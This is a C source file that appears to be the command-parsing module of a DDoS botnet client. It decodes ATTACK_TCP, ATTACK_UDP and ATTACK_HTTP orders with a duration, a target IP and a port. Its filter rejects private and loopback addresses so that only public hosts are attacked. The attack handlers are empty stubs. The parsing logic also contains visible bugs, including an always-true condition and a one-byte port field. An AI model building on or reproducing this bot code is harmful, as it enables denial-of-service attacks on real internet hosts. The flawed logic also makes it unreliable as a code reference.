#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>
#include <stdint.h>

#include "command.h"

const char *__command_type_strings[] = {
    "PING",
    "HELLO",
    "ATTACK_TCP",
    "ATTACK_UDP",
    "ATTACK_HTTP",
    "EXIT",

};

static inline char *get_command_type_string(enum command_type type)
{
    if (type == 0 || (type & (type - 1)) != 0 || type > (1 << 4))
    {
        return "Unknown Command";
    }

    return __command_type_strings[__builtin_ctz(type)];
}

static uint8_t get_command_from_buffer(struct command *cmd, uint8_t buffer[])
{
    if (cmd == NULL || buffer == NULL)
    {
        return 0;
    }

    cmd->type = buffer[0];

    if (cmd->type != PING || cmd->type != EXIT)
    {

        cmd->data.duration = buffer[1];

        cmd->data.target.o1 = buffer[2];
        cmd->data.target.o2 = buffer[3];
        cmd->data.target.o3 = buffer[4];
        cmd->data.target.o4 = buffer[5];

        cmd->data.port = buffer[6];
    }

    return cmd->type;
}

static struct command command_init()
{
    struct command new_command;
    memset(&new_command, 0, sizeof(new_command));

    return new_command;
}

static uint8_t parse_command(struct command *cmd)
{
    if (cmd == NULL)
    {
        return 0;
    }

    switch (cmd->type)
    {
    case ATTACK_TCP:
        break;

    case ATTACK_UDP:
        break;

    case PING:
        break;

    case EXIT:
        break;

    default:
#ifdef DEBUG
        printf("Unknown command: 0x%02X\n", cmd->type);
#endif
        return 0;
    }

    return 1;
}

uint8_t parse_command_from_buffer(uint8_t buffer[])
{

    uint8_t type, duration, port;
    uint8_t o1, o2, o3, o4;

    struct command cmd = command_init();

    if (get_command_from_buffer(&cmd, buffer) == 0)
    {
        return 0;
    }

    type = cmd.type;
    duration = cmd.data.duration;

    o1 = cmd.data.target.o1;
    o2 = cmd.data.target.o2;
    o3 = cmd.data.target.o3;
    o4 = cmd.data.target.o4;
    port = cmd.data.port;

#ifdef DEBUG
    printf("[command] Type: %s, Duration: %d, Address: %d.%d.%d.%d, Port: %d\n",
           get_command_type_string(type), duration, o1, o2, o3, o4, port);
#endif

    // validations
    if (
        (type == 0) || (duration == 0) || (port == 0) || (o1 == 0 && o2 == 0 && o3 == 0 && o4 == 0) // 0.0.0.0 (not valid)
        || (o1 == 127)                                                                              // 127.x.x.x (loopback)
        || (o1 == 0) ||                                                                             // 0.x.x.x (net addr)
        (o1 == 255) ||                                                                              // 255.x.x.x (broadcast)
        (o1 == 10) ||                                                                               // 10.x.x.x (private)
        (o1 == 172 && o2 >= 16 && o2 <= 31) ||                                                      // 172.16.x.x - 172.31.x.x (private)
        (o1 == 192 && o2 == 168)                                                                    // 192.168.x.x (private)
    )
    {
        return 0;
    }

    return 1;
}
